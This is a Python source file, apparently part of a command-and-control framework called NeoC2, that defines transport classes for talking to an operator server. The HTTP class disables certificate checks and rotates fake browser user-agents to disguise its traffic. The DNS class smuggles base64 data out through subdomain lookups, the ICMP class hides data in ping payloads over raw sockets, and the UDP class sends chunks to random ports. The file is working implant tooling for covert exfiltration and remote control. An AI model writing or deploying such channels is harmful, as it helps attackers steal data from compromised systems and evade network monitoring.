import os
import random
import string
import base64
import json
import time
import requests
import socket
import struct
import dns.resolver
from core.config import NeoC2Config

class HTTPProtocol:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.session.verify = False  # Ignore SSL certificate validation
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
    
    def send(self, data, target=None, proxy=None):
        if not target:
            target = f"https://{self.config.get('server.host')}:{self.config.get('server.port')}"
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Content-Type': 'application/json'
        }

        if isinstance(data, str):
            data = {'data': data}
        elif isinstance(data, bytes):
            data = {'data': base64.b64encode(data).decode('utf-8')}

        try:
            if proxy:
                proxies = {
                    'http': proxy,
                    'https': proxy
                }
                response = self.session.post(target, json=data, headers=headers, proxies=proxies, timeout=10)
            else:
                response = self.session.post(target, json=data, headers=headers, timeout=10)

            return response.status_code == 200
        except Exception as e:
            print(f"HTTP send error: {str(e)}")
            return False
    
    def receive(self, timeout=30):
        target = f"https://{self.config.get('server.host')}:{self.config.get('server.port')}/receive"
        
        headers = {
            'User-Agent': random.choice(self.user_agents)
        }

        try:
            response = self.session.get(target, headers=headers, timeout=timeout)
            if response.status_code == 200:
                return response.json()
            return None
        except Exception as e:
            print(f"HTTP receive error: {str(e)}")
            return None

class DNSProtocol:
    def __init__(self, config):
        self.config = config
        self.dns_server = config.get('communication.dns_server', '8.8.8.8')
        self.domain = config.get('communication.dns_domain', 'example.com')
    
    def send(self, data, target=None, proxy=None):
        """Send data via DNS"""
        if not target:
            target = self.domain
        
        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')

        max_label_length = 63
        chunks = [encoded_data[i:i+max_label_length] for i in range(0, len(encoded_data), max_label_length)]

        for i, chunk in enumerate(chunks):
            subdomain = f"{chunk}.{i}.{target}"
            try:
                answers = dns.resolver.resolve(subdomain, 'A', lifetime=10)
            except dns.resolver.NXDOMAIN:
                pass
            except Exception as e:
                print(f"DNS send error: {str(e)}")
                return False

        return True
    
    def receive(self, timeout=30):
        return None

class ICMPProtocol:
    def __init__(self, config):
        self.config = config
    
    def send(self, data, target=None, proxy=None):
        if not target:
            target = self.config.get('server.host')
        
        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')

        max_icmp_payload = 1472  # Maximum ICMP payload size
        icmp_packets = []
        for i in range(0, len(encoded_data), max_icmp_payload):
            payload = encoded_data[i:i+max_icmp_payload]
            icmp_packets.append(payload)

        try:
            target_ip = socket.gethostbyname(target)

            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(5)

            for i, payload in enumerate(icmp_packets):
                icmp_type = 8  # Echo Request
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = os.getpid() & 0xFFFF
                icmp_seq = i + 1

                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)

                icmp_checksum = self._calculate_checksum(icmp_header + payload.encode('utf-8'))

                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)

                sock.sendto(icmp_header + payload.encode('utf-8'), (target_ip, 0))

            sock.close()
            return True
        except Exception as e:
            print(f"ICMP send error: {str(e)}")
            return False
    
    def receive(self, timeout=30):
        return None
    
    def _calculate_checksum(self, data):
        if len(data) % 2 != 0:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
            checksum = (checksum & 0xffff) + (checksum >> 16)
        
        return ~checksum & 0xffff

class UDPProtocol:
    def __init__(self, config):
        self.config = config
    
    def send(self, data, target=None, proxy=None):
        if not target:
            target = self.config.get('server.host')
        
        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')

        max_udp_payload = 1472  # Maximum UDP payload size
        udp_packets = []
        for i in range(0, len(encoded_data), max_udp_payload):
            payload = encoded_data[i:i+max_udp_payload]
            udp_packets.append(payload)

        port = random.randint(1024, 65535)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)

            for payload in udp_packets:
                sock.sendto(payload.encode('utf-8'), (target, port))

            sock.close()
            return True
        except Exception as e:
            print(f"UDP send error: {str(e)}")
            return False
    
    def receive(self, timeout=30):
        return None
